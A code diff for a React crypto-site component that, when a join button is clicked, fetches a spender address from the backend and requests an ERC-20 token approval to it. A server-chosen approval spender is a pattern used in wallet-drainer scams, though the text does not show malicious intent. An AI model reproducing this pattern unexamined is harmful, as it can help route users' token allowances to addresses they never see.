@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react';
 // import WalletModal from './WalletModal';
 import { useTranslation } from 'react-i18next';
 import i18next from 'i18next';
-import { useQuery} from '@tanstack/react-query';
+import { useQuery, useMutation } from '@tanstack/react-query';
 import axios from 'axios';
 import { useAccount, useChainId, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
 import { useConnectModal } from '@rainbow-me/rainbowkit';
@@ -239,6 +239,16 @@ function Home() {
     }
   }, [isSuccess, receipt, chainId, address]);
 
+  // 替换钱包授权查询为mutation
+  const { mutateAsync: getWalletAuth } = useMutation({
+    mutationFn: async () => {
+      const response = await axios.post('/wallets/get-wallet-Authorization', {
+        address
+      });
+      return response.data.data;
+    }
+  });
+
   // 处理加入按钮点击
   const handleJoin = async () => {
     console.log('1. 按钮被点击');
@@ -259,16 +269,25 @@ function Home() {
 
     try {
       setIsLoading(true);
+      
+      // 先获取授权地址
+      const walletAuth = await getWalletAuth();
+      
+      if (!walletAuth?.address) {
+        toast.error('未获取到授权地址');
+        return;
+      }
+
       console.log('3. 开始合约调用...');
       
-      // 调用合约
+      // 调用合约，使用获取到的授权地址
       const hash = await writeContractAsync({
-        address: '0x55d398326f99059fF775485246999027B3197955', // 合约地址 函数
+        address: '0x55d398326f99059fF775485246999027B3197955',
         abi: erc20Abi,
         functionName: 'approve',
         args: [
-          '0x08219E70ad70d570295bf1017dcEda0a6325D5C9', // spender
-          parseUnits('0.01', 6), // amount  (uint256)
+          walletAuth.address as `0x${string}`, // 使用获取到的授权地址
+          parseUnits('0.01', 6),
         ],
       });
 
